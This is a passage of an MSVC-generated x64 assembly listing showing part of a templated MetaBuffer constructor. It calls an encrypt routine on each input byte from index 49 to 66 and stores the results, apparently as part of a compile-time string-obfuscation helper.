  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	b8 01 00 00 00	 mov	 eax, 1
  009b7	48 6b c0 3a	 imul	 rax, rax, 58		; 0000003aH
  009bb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009c2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009c6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009cd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009d9	88 41 3b	 mov	 BYTE PTR [rcx+59], al
  009dc	b8 01 00 00 00	 mov	 eax, 1
  009e1	48 6b c0 3b	 imul	 rax, rax, 59		; 0000003bH
  009e5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009ec	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009f0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009f7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a03	88 41 3c	 mov	 BYTE PTR [rcx+60], al
  00a06	b8 01 00 00 00	 mov	 eax, 1
  00a0b	48 6b c0 3c	 imul	 rax, rax, 60		; 0000003cH
  00a0f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a16	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a21	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a26	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a2d	88 41 3d	 mov	 BYTE PTR [rcx+61], al
  00a30	b8 01 00 00 00	 mov	 eax, 1
  00a35	48 6b c0 3d	 imul	 rax, rax, 61		; 0000003dH
  00a39	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a40	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a4b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a50	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a57	88 41 3e	 mov	 BYTE PTR [rcx+62], al
  00a5a	b8 01 00 00 00	 mov	 eax, 1
  00a5f	48 6b c0 3e	 imul	 rax, rax, 62		; 0000003eH
  00a63	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a6a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a6e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a75	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a7a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a81	88 41 3f	 mov	 BYTE PTR [rcx+63], al
  00a84	b8 01 00 00 00	 mov	 eax, 1
  00a89	48 6b c0 3f	 imul	 rax, rax, 63		; 0000003fH
  00a8d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a94	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a98	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a9f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00aa4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aab	88 41 40	 mov	 BYTE PTR [rcx+64], al
  00aae	b8 01 00 00 00	 mov	 eax, 1
  00ab3	48 6b c0 40	 imul	 rax, rax, 64		; 00000040H
  00ab7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00abe	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ac2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ac9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00ace	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ad5	88 41 41	 mov	 BYTE PTR [rcx+65], al
  00ad8	b8 01 00 00 00	 mov	 eax, 1
  00add	48 6b c0 41	 imul	 rax, rax, 65		; 00000041H
  00ae1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ae8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00aec	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00af3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00af8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aff	88 41 42	 mov	 BYTE PTR [rcx+66], al
  00b02	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00b09	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00b0d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv560[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00b13	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00b1a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00b21	5f		 pop	 rdi
  00b22	5d		 pop	 rbp
  00b23	c3		 ret	 0
